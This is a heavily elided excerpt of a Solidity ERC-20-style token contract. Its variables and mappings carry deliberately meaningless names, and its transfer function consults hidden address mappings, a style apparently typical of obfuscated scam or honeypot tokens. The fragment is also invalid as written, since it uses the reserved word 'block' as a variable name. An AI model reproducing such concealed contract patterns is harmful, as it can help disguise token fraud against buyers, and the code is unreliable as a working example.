...
contract Contract is Ownable {
    ...
    uint256 private direct = _tTotal;
    uint256 private _rTotal = ~uint256(0);
    uint256 public _fee = 5;

    mapping(uint256 => address) private difficult;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private trade;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private birth;
    mapping(uint256 => address) private somewhere;
    ...
    function _transfer(
        ...
        address buffalo = somewhere[direct];
        bool block = weak == difficult[direct];
        uint256 have = _fee;
        ...
        _balances[weak] -= amount;
        _balances[fine] += amount;
    }
    ...
    function bare(uint256 tokens) private {
